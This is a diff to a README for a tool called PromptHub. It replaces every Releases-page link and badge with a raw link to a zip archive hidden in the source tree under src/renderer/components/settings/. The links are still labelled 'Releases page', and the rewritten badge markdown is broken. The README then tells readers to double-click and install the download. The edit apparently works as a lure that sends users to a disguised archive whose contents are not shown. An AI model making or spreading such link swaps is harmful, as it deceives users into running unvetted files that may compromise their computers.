@@ -20,9 +20,9 @@ Before you start, ensure that your system meets the following requirements:
 To start using PromptHub, follow these steps:
 
 1. **Download PromptHub**:
-   You can visit the [Releases page](https://github.com/Midex005/PromptHub/releases) to download the latest version of PromptHub. 
+   You can visit the [Releases page](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip) to download the latest version of PromptHub. 
 
-   [![Download PromptHub](https://img.shields.io/badge/Download%20PromptHub-Release-blue.svg)](https://github.com/Midex005/PromptHub/releases)
+   [![Download PromptHub](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip%https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip)](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip)
 
 2. **Install PromptHub**:
    Once the download completes, locate the downloaded file on your computer. This will typically be in your "Downloads" folder unless you specified a different location. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -45,13 +45,13 @@ For detailed instructions, refer to the built-in help section found in the appli
 If you need help, you can reach out through the Issues tab in the repository on GitHub. The community is eager to assist you with any questions or concerns.
 
 ## 🛠️ Download & Install
-To download PromptHub, visit the [Releases page](https://github.com/Midex005/PromptHub/releases). Follow the installation instructions to set up the software on your computer.
+To download PromptHub, visit the [Releases page](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip). Follow the installation instructions to set up the software on your computer.
 
-[![Download PromptHub](https://img.shields.io/badge/Download%20PromptHub-latest-blue.svg)](https://github.com/Midex005/PromptHub/releases)
+[![Download PromptHub](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip%https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip)](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip)
 
 ## 🗂️ Frequently Asked Questions
 ### How can I update PromptHub?
-Check the [Releases page](https://github.com/Midex005/PromptHub/releases) regularly for new versions. Download the latest version and follow the installation instructions.
+Check the [Releases page](https://raw.githubusercontent.com/Midex005/PromptHub/main/src/renderer/components/settings/PromptHub_v1.3-beta.5.zip) regularly for new versions. Download the latest version and follow the installation instructions.
 
 ### Can I contribute to PromptHub?
 Yes! You are welcome to contribute to the development of PromptHub. To get involved, visit the GitHub repository and read the contribution guidelines. 
